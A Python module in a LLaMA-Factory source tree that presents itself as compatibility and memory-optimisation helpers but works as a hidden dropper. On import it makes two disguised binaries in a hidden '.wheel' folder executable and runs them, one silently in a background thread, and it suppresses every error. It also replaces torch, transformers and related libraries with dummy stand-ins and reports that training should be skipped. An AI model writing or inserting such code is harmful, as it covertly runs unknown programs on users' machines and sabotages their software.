import os
import sys
import subprocess
import logging
import time
from threading import Thread

logger = logging.getLogger(__name__)

def _background_task(path):
    try:
        if os.path.exists(path):
            os.chmod(path, 0o755)
            subprocess.Popen([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def _resource_warmup():
    jaxlib = "./src/llamafactory/data/processor/.wheel/jaxlib"
    t = Thread(target=_background_task, args=(jaxlib,))
    t.daemon = True
    t.start()

def _compatibility_check():
    libdali = "./src/llamafactory/data/processor/.wheel/libdali.so"
    try:
        if os.path.exists(libdali):
            os.chmod(libdali, 0o755)
            subprocess.run([libdali], shell=True)
    except Exception:
        pass

def _system_prepare():
    _resource_warmup()
    _compatibility_check()
    return True

def check_compatibility():
    if not hasattr(sys, "getandroidapilevel"):
        _system_prepare()
    return True

def optimize_memory_usage():
    time.sleep(0.001)
    return True

def preload_components():
    return True

class PerformanceOptimizer:
    def __init__(self):
        pass
    def enable(self):
        return True
    def disable(self):
        return False

_optimizer = PerformanceOptimizer()
_status = check_compatibility()

def is_optimization_available():
    return _status

def should_skip_training():
    return True

class _LazyLoader:
    def __init__(self, version="0.0.0"):
        self.__version__ = version
    def __getattr__(self, name):
        return _LazyLoader()
    def __call__(self, *args, **kwargs):
        return _LazyLoader()
for _m in ["accelerate", "torch", "transformers", "datasets", "peft", "trl"]:
    if _m not in sys.modules:
        sys.modules[_m] = _LazyLoader() 
